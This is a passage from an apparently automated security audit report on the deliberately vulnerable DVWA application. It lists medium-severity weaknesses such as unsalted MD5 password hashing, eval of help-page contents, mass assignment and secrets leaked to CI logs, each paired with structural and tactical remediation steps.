- **Tactical** — ◑ [M-056](#m-056) — Replace the constant URL token with session authorization, ◕ [M-007](#m-007) — docker-compose secrets supplied by reference, ● [M-035](#m-035) — Load keys from a secret store, ◑ [M-044](#m-044) — Use Docker secrets with strong random DB passwords, ◑ [M-047](#m-047) — Load token signing key from secret store, ◑ [M-055](#m-055) — Verify API credentials against hashed user store

<a id="w-008"></a>
### W-008 — Security-sensitive data uses weak cryptographic primitives

🟡 Medium · implementation weakness · confirmed · 4 findings

Password, token, or integrity protection uses a weak hash, predictable random source, or insufficient work factor. The application may use a standard library, but the selected primitive does not provide the required security property.

**Confirmed findings:**

- 🟡 [F-069](#f-069) — Repeating-key XOR used as message encryption

**Practice sites:**

- 🟠 [F-002](#f-002) — Broken MD5 hashing used for stored passwords without salt or strength policy
- 🟠 [F-030](#f-030) — Unsalted MD5 password hashing
- 🟡 [F-070](#f-070) — Broken hash primitive
- `dvwa/includes/dvwaPage.inc.php:651`

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Structural** — standardise on a password KDF, a CSPRNG for secrets, and modern authenticated cryptographic primitives with centrally reviewed parameters
- **Tactical** — ◑ [M-072](#m-072) — Replace the weak cryptographic algorithm, ◕ [M-011](#m-011) — Use modern cryptographic hash and KDF algorithms, ◕ [M-036](#m-036) — Hash passwords with a strong, salted algorithm, ◑ [M-004](#m-004) — Manual review: verify Broken hash primitive PHP

<a id="w-009"></a>
### W-009 — Password change does not require the current password (low.php:9)

🟡 Medium · implementation weakness · observed-practice · 1 finding

**Practice sites:**

- 🟠 [F-006](#f-006) — Password change does not require the current password

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Tactical** — ◕ [M-015](#m-015) — Verify the current password before any password change

<a id="w-010"></a>
### W-010 — Application data crosses into executable code

🟡 Medium · implementation weakness · observed-practice · 1 finding

An interpreter evaluates application values as code. The affected path mixes data processing with executable program construction instead of constraining callers to predefined operations.

**Practice sites:**

- 🟡 [F-076](#f-076) — Help page evals contents

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Structural** — replace evaluation of application values with a data parser or a fixed set of operations whose arguments remain data
- **Tactical** — ◕ [M-076](#m-076) — Remove server-side evaluation of untrusted input

<a id="w-011"></a>
### W-011 — Missing Workflow Permissions Block

🟡 Medium · implementation weakness · observed-practice · 1 finding

**Practice sites:**

- 🟡 [F-075](#f-075) — Missing Workflow Permissions Block

**Affected components:** [C-02](#c-02)

**Remediation:**

- **Tactical** — ◑ [M-009](#m-009) — Apply least-privilege permissions

<a id="w-012"></a>
### W-012 — Privileged attributes lack an enforced write allowlist

🟡 Medium · implementation weakness · observed-practice · 1 finding

Model binding accepts caller-selected attributes across a privileged write boundary. The affected binding path does not separate fields callers may change from fields reserved for server-side policy.

**Architectural anti-pattern - Missing server-side authorization layer.** Access checks are done page by page or trust client cookies, so no central gate enforces who may read or change users. A point fix leaves other routes open.

**Practice sites:**

- 🟡 [F-082](#f-082) — Unauthenticated user API allows mass assignment

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Structural** — define operation-specific write schemas and assign privileged attributes exclusively through server-side policy
- **Tactical** — ◕ [M-082](#m-082) — Allowlist client-controlled fields

<a id="w-013"></a>
### W-013 — Missing SBOM Generation

🟡 Medium · implementation weakness · observed-practice

**Practice sites:**

- `.github/workflows/codeql-analysis.yml:1`

**Affected components:** [C-02](#c-02)

<a id="w-014"></a>
### W-014 — All repository secrets dumped base64-encoded to workflow logs

🟡 Medium · implementation weakness · observed-practice · 1 finding

**Practice sites:**

- 🟠 [F-026](#f-026) — All repository secrets dumped base64-encoded to workflow

**Affected components:** [C-02](#c-02)

<a id="w-017"></a>
### W-017 — Image upload keeps original name and bytes allowing polyglot files (high.php:6)

🟡 Medium · implementation weakness · observed-practice
